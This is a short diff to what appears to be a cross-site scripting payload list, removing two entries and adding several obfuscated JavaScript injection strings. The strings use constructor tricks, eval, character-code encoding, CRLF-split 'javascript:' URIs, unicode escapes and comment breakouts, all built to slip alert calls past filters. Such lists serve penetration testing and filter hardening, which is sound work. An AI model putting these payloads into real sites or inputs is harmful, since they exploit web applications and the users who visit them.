@@ -233,5 +233,7 @@ Array[Symbol.species].constructor('alert(1)')();
 Array.prototype[Symbol.hasInstance]=eval;"alert(1)" instanceof [];
 javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108))
 javascr%0d%0aipt%3Aalert.call(this,%20document.domain)
-f=(x=alert(1))=>{}; f();
-!class extends`${alert(1)}```{}
+f=(x=alert(1))=>{};f();
+x=(lol=alert(1),x=class x extends x{constructor(){alert(1)}}()()()()())=>class x extends x{}()()();x()
+\'-a\u{6c}e\u{72}t(1))%0a-->
+eval(`ale${[[[[]=[]]=[[]=[]]]=[[]=[]]]=[]}rt(1)`);
